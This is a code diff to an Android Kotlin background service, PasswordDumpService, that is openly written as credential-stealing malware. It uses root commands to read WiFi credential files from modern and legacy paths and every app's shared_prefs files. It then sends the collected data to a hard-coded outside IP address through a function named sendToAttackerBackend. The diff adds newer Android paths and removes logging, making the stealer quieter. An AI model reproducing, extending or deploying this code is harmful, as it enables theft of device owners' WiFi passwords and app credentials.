@@ -22,7 +22,6 @@ class PasswordDumpService : Service() {
         Log.d(TAG, "Service started")
         Thread {
             val dumpedData = dumpStoredPasswords()
-            Log.d(TAG, "Password data collected, sending to backend...")
             sendToAttackerBackend(dumpedData)
         }.start()
         return START_STICKY
@@ -31,17 +30,26 @@ class PasswordDumpService : Service() {
     private fun dumpStoredPasswords(): String {
         val sb = StringBuilder("=== STORED PASSWORDS DUMP ===\n\n")
 
-        // WiFi passwords (requires root)
-        sb.append("--- WiFi Passwords ---\n")
-        val wifiData = executeRootCommand("cat /data/misc/wifi/wpa_supplicant.conf")
-        if (wifiData != null) {
-            sb.append(wifiData)
+        // WiFi passwords (Targeting Android 12/13/14 Apex path)
+        sb.append("--- WiFi Passwords (Modern Apex) ---\n")
+        val apexWifi = executeRootCommand("cat /data/misc/apexdata/com.android.wifi/WifiConfigStore.xml")
+        if (apexWifi != null && apexWifi.contains("WifiConfiguration")) {
+            sb.append(apexWifi)
         } else {
-            sb.append("No root access or file not found\n")
-            Log.w(TAG, "Failed to dump WiFi passwords (likely no root)")
+            // Fallback to older Modern path
+            sb.append("--- WiFi Passwords (Standard Modern) ---\n")
+            val modernWifi = executeRootCommand("cat /data/misc/wifi/WifiConfigStore.xml")
+            if (modernWifi != null && modernWifi.contains("WifiConfiguration")) {
+                sb.append(modernWifi)
+            } else {
+                // Legacy Fallback
+                sb.append("--- WiFi Passwords (Legacy Fallback) ---\n")
+                val legacyWifi = executeRootCommand("cat /data/misc/wifi/wpa_supplicant.conf")
+                sb.append(legacyWifi ?: "No WiFi data found in any known location\n")
+            }
         }
 
-        // SharedPreferences from all apps
+        // SharedPreferences Scraper
         sb.append("\n--- SharedPreferences ---\n")
         val prefsList = executeRootCommand("find /data/data -name \"*.xml\" -path \"*/shared_prefs/*\" 2>/dev/null")
         prefsList?.let { list ->
@@ -50,7 +58,7 @@ class PasswordDumpService : Service() {
                 sb.append("\nFile: $file\n")
                 sb.append(executeRootCommand("cat \"$file\"") ?: "Failed\n")
             }
-        } ?: sb.append("No root access for data folder\n")
+        }
 
         return sb.toString()
     }
@@ -76,17 +84,11 @@ class PasswordDumpService : Service() {
                 .url("http://47.129.144.9:8000/dump/passwords")
                 .post(requestBody)
                 .build()
-            
-            Log.d(TAG, "Attempting connection to http://47.129.144.9:8000/dump/passwords")
             client.newCall(request).execute().use { response ->
-                if (response.isSuccessful) {
-                    Log.i(TAG, "Password exfiltration successful")
-                } else {
-                    Log.e(TAG, "Password exfiltration failed: ${response.code}")
-                }
+                if (response.isSuccessful) Log.i(TAG, "WiFi/Password exfiltration successful")
             }
         } catch (e: Exception) {
-            Log.e(TAG, "Network error during Password exfil: ${e.message}")
+            Log.e(TAG, "Network error: ${e.message}")
         }
     }
 }
